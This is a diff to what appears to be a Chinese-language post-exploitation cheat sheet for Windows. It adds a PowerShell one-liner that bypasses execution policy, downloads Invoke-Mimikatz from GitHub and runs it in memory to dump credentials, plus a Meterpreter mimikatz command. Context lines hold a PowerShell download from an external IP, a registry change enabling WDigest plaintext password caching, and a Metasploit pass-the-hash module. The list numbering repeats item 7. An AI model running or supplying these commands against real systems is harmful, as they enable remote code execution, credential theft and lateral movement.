@@ -23,6 +23,10 @@ powershell (new-object System.Net.WebClient).DownloadFile('http:/http://121.43.
 
 6、抓明文（windows 2008 R2 后需修改注册表项 use post/windows/manage/wdigest_caching）或者 reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
 
+7、mimikatz
+powershell.exe  -nop -exec bypass  -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz"
+或者
+meterpreter load mimikatz
 
 7、hash传递登录
  use exploit/windows/smb/psexec_psh
